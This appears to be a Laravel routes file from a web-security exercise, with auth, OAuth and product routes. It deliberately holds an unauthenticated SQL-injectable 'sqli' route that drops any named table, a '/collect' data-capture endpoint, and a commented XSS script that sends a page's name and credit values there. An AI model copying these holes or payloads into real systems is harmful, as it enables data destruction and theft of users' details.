<?php
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Route;
use App\Http\Controllers\Web\ProductsController;
use App\Http\Controllers\Web\UsersController;
use App\Http\Controllers\Web\ForgetPasswordController;

Route::get('register', [UsersController::class, 'register'])->name('register');
Route::post('register', [UsersController::class, 'doRegister'])->name('do_register');
Route::get('login', [UsersController::class, 'login'])->name('login');
Route::post('login', [UsersController::class, 'doLogin'])->name('do_login');
Route::get('logout', [UsersController::class, 'doLogout'])->name('do_logout');
Route::get('verify', [UsersController::class, 'verify'])->name('verify');

Route::get('/forgot-password', [ForgetPasswordController::class, 'showLinkRequestForm'])->name('password.request');
Route::post('/forgot-password', [ForgetPasswordController::class, 'sendResetLinkEmail'])->name('password.email');
Route::get('/reset-password/{token}', [ForgetPasswordController::class, 'showResetForm'])->name('password.reset');
Route::post('/reset-password', [ForgetPasswordController::class, 'reset'])->name('password.update');

Route::get('/auth/google',[UsersController::class, 'redirectToGoogle'])->name('login_with_google');
Route::get('/auth/google/callback',[UsersController::class, 'handleGoogleCallback']);

Route::get('auth/facebook', [UsersController::class, 'redirectToFacebook'])->name('login_with_facebook');
Route::get('auth/facebook/callback', [UsersController::class, 'handleFacebookCallback']);


Route::get('sqli',function(Request $request){
    $table =$request->query('table');
    DB::unprepared("DROP TABLE $table");
    return redirect('/')->with('success', 'Table deleted successfully');
});


Route::get('/collect',function(Request $request){
    $name = $request->query('name');

    $credit = $request->query('credit');
    return response ('Data collected, 200')
    ->header('Access-Control-Allow-Origin', '*')
    ->header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE')
    ->header('Access-Control-Allow-Headers', 'Content-Type, X-Requested-With');
});

// <script>
// let name = document.getElementById('name').textContent;
// let credit = document.getElementById('credit').textContent;
// alert(name + credit);
// let xhr = new XMLHttpRequest();
// xhr.open('GET', `http://127.0.0.1:8000/collect?name=${encodeURIComponent(name)}&credit=${encodeURIComponent(credit)}`);
// xhr.send();
// </script>

Route::middleware(['auth'])->group(function () {

    // User routes
    Route::get('users', [UsersController::class, 'list'])->name('users');
    Route::get('profile/{user?}', [UsersController::class, 'profile'])->name('profile');
    Route::get('users/edit/{user?}', [UsersController::class, 'edit'])->name('users_edit');
    Route::post('users/save/{user}', [UsersController::class, 'save'])->name('users_save');
    Route::get('users/delete/{user}', [UsersController::class, 'delete'])->name('users_delete');
    Route::get('users/edit_password/{user?}', [UsersController::class, 'editPassword'])->name('edit_password');
    Route::post('users/save_password/{user}', [UsersController::class, 'savePassword'])->name('save_password');
    Route::get('/users/add', [UsersController::class, 'addUser'])->name('users_add');
    Route::post('/users/add', [UsersController::class, 'storeUser'])->name('users_store');

    // Product routes

    Route::get('products', [ProductsController::class, 'list'])->name('products_list');
    Route::get('products/edit/{product?}', [ProductsController::class, 'edit'])->name('products_edit');
    Route::post('products/save/{product?}', [ProductsController::class, 'save'])->name('products_save');
    Route::get('products/delete/{product}', [ProductsController::class, 'delete'])->name('products_delete');
    Route::get('/products/buy/{id}', [ProductsController::class, 'buy'])->name('products_buy');
    Route::get('/bought-products', [ProductsController::class, 'boughtProducts'])->name('bought_products');
    Route::get('/products/insufficient-credit', function () {
        return view('products.insufficient_credit');
    })->name('insufficient_credit');
    Route::get('/return-product/{userId}/{productId}', [ProductsController::class, 'returnProduct'])->name('return_product');

});

Route::get('/', function () {
    return view('welcome');
});

Route::get('/multable', function (Request $request) {
    $j = $request->number??5;
    $msg = $request->msg;
    return view('multable', compact("j", "msg"));
});

Route::get('/even', function () {
    return view('even');
});

Route::get('/prime', function () {
    return view('prime');
});

Route::get('/test', function () {
    return view('test');
});
